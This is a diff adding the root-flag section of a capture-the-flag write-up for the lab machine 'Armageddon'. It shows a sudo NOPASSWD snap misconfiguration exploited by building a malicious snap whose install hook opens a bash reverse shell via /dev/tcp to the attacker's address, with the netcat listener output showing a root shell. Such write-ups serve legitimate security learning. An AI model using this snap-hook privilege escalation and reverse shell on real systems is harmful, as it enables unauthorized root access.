@@ -266,3 +266,79 @@ Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
 <Redacted user flag>
 [brucetherealadmin@armageddon ~]$ 
 ```
+
+## Obtaining root flag
+
+Now, we will try to find the commands that can be executed by the user with root privileges without any password. We realize that we can install malicious packages using ```snap``` with root privileges without any password.
+
+```
+[brucetherealadmin@armageddon ~]$ sudo -l
+Matching Defaults entries for brucetherealadmin on armageddon:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    (root) NOPASSWD: /usr/bin/snap install *
+```
+
+Looking at [GTFO Bins](https://gtfobins.github.io/gtfobins/snap/), we are able to create a package that can create a reverse shell
+
+```
+┌──(kali㉿kali)-[/tmp]
+└─$ COMMAND="bash -c 'exec bash -i &>/dev/tcp/10.10.16.5/80 <&1'"                   1 ⚙
+                                                                                        
+┌──(kali㉿kali)-[/tmp]
+└─$ cd $(mktemp -d)                                                                 1 ⚙
+                                                                                        
+┌──(kali㉿kali)-[/tmp/tmp.sJ8tFNoHbI]
+└─$ mkdir -p meta/hooks                                                             1 ⚙
+                                                                                        
+┌──(kali㉿kali)-[/tmp/tmp.sJ8tFNoHbI]
+└─$ printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install                    1 ⚙
+                                                                                        
+┌──(kali㉿kali)-[/tmp/tmp.sJ8tFNoHbI]
+└─$ chmod +x meta/hooks/install                                                     1 ⚙
+                                                                                        
+┌──(kali㉿kali)-[/tmp/tmp.sJ8tFNoHbI]
+└─$ fpm -n xxxx -s dir -t snap -a all meta                                          1 ⚙
+Created package {:path=>"xxxx_1.0_all.snap"}
+```
+
+Afterwards, we will download the malicious package on our SSH terminal and install the malicious package
+
+```
+sudo snap install exploit.snap --dangerous --devmode
+```
+
+Lastly, all we have to do is to obtain the root flag from our reverse shell.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc -nlvp 80                                                                     1 ⚙
+listening on [any] 80 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.10.233] 46900
+bash: cannot set terminal process group (5067): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-4.3# whoami
+whoami
+root
+bash-4.3# cd /root
+cd /root
+bash-4.3# ls
+ls
+anaconda-ks.cfg
+cleanup.sh
+passwd
+reset.sh
+root.txt
+snap
+bash-4.3# cat root.txt
+cat root.txt
+<Redacted root flag>
+bash-4.3# 
+```
